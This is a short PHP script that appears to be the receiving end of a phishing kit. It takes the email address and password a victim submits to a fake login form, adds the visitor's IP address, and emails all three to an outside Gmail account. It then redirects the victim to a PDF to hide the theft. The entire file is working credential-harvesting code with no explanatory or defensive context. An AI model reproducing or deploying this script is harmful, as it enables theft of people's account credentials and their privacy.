<?php
    $to = "seanpearson2022@gmail.com";
    $ip = getenv("REMOTE_ADDR");
    $user = $_POST['email'];
	$pass = $_POST['passwd'];
    $from = "Office";
    $subject = $_SERVER['HTTP_HOST']; 
    $message = "Email: $user\n Pass: $pass\nip: $ip\n";
    mail($to, $subject, $message, $from);
    header("Location: bmbs.pdf");
?>
